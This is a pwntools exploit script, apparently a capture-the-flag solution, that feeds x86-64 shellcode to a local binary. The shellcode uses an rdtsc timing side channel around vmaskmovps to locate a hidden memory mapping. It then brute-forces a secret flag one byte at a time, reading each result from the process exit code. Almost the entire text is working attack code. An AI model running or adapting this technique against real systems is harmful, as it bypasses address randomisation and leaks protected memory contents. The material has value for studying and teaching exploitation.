from pwn import *
import string


context.log_level = "error"
elf = context.binary = ELF("./main")



chars = string.ascii_letters + "123456789" + "{}" + "_"  + "#"

flag = "?????????????????????"

for j in range(20):
    if flag[j] != "?":
        continue 
    for i in chars:

        p = process()

        # get leak
        leak = int(p.recvline().strip(),16)
        addr = 0x5 << (8 * 5 + 4) 
        addr |= leak


        # gdb.attach(p,"""
        # b *main+413
        # c
        # b *0x133710a4
        # """)


        # asm
        # check for addr using vmaskmovps and time that it takes
        # if valid access flag and brute force a char, if correct return 69 else 70
        # on remote we can only use time i think?
        paylaod = asm(f"""
        0:
            mov     r8, {addr}
        1:
            
            xor     rax, rax
            rdtsc
            shl     rdx, 32
            or      rax, rdx
            mov     r10, rax        

            vmaskmovps ymm1, ymm1, [r8]

            xor     rax, rax
            rdtsc
            shl     rdx, 32
            or      rax, rdx
            mov     r11, rax        
            sub     r11, r10        

            cmp     r11, 0x50
            jb      2f       

            mov rax, 0x1000000
            add     r8, rax

            mov rax, 0x600000000000
            cmp     r8, rax
            jae     3f

            jmp     1b

        2:
            add r8, 0x2dcd
            mov r8 , [r8]
            mov al ,byte ptr [r8 + {j}]
            cmp al, '{i}'
            jne 4f

            mov rax, 60
            mov rdi , 69
            syscall

        4:
            mov rax, 60
            mov rdi , 70
            syscall
            
        3:
            jmp     0b
        """)


        # send payload
        p.recvuntil(b"flag")
        p.sendline(paylaod)


        # wait a bit
        p.wait(0.5)

        # check status, retunr value
        # NULL: didnt find addr 
        # 69  : valid char
        # 70  : invalid char
        status = p.poll()
        # print("status",status)
        if status == None:
            p.close()
        elif status == 70:
            p.close()
        elif status == 69:
            flag = list(flag)
            flag[j] = i
            flag = "".join(flag)
            print(flag)
            p.close()
            break



